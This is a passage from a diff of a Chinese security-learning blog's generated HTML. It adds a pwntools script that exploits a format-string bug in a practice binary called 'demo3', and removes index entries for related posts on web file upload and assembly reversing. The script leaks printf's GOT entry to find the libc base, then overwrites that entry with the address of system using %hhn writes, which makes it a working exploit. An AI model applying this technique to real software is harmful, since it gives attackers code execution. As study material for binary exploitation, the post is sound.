+<li>利用函数计算system地址，填充<br>### <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./demo3&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">printf_got=0x804a00c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Find these offset </span><br><span class="line">printf_off=libc.symbols[&quot;printf&quot;]</span><br><span class="line">system_off=libc.symbols[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fmt(s):</span><br><span class="line">	p.sendline(s)</span><br><span class="line">	d = p.recv()</span><br><span class="line">	return d</span><br><span class="line"></span><br><span class="line"># Calculate libc base address by leaking printf@got</span><br><span class="line">base = u32(fmt(p32(printf_got)+&apos;%5$s&apos;)[4:8])-printf_off</span><br><span class="line">system = base + system_off</span><br><span class="line">print &apos;Libc base:&apos;, hex(base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Prepare %hhn format string</span><br><span class="line">r = &apos;&apos;.join(p32(printf_got+i) for i in range(4))</span><br><span class="line">printed = 16	</span><br><span class="line">for i in range(4):</span><br><span class="line">	byte = (system &gt;&gt; (i*8)) &amp; 0xff # value of byte[i]</span><br><span class="line">	pad = ((byte - printed) % 256 + 256) % 256</span><br><span class="line">	if pad &gt; 0:</span><br><span class="line">		r += &apos;%%%dc&apos; % (pad)</span><br><span class="line">	r += &apos;%%%d$hhn&apos; % (5+i)</span><br><span class="line">	printed +=pad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Overwrite printf() to system</span><br><span class="line">fmt(r)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 
       
@@ -677,124 +1093,6 @@
       
         <p class="article-more-link">
           <a  href="/2018/07/08/爬坑之路--BIN(四)--7/#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="w-爬坑之路--WEB(四)--6" class="article article-type-w" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/07/07/爬坑之路--WEB(四)--6/" class="article-date">
-      <time datetime="2018-07-07T14:22:43.000Z" itemprop="datePublished">2018-07-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/07/爬坑之路--WEB(四)--6/">爬坑之路--WEB(四)--6</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>文件上传…..<br>是我飘了，提不起Cknife了吗？<br>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2018/07/07/爬坑之路--WEB(四)--6/#more">大航海 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-爬坑之路--BIN(三)--5" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/07/05/爬坑之路--BIN(三)--5/" class="article-date">
-      <time datetime="2018-07-05T07:29:37.000Z" itemprop="datePublished">2018-07-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/05/爬坑之路--BIN(三)--5/">爬坑之路--BIN(三)--5</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>汇编语句反推，<br>让人有点头大的…<br>
-          
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-        <p class="article-more-link">
-          <a  href="/2018/07/05/爬坑之路--BIN(三)--5/#more">大航海 >></a>
         </p>
       
       <div class="clearfix"></div>
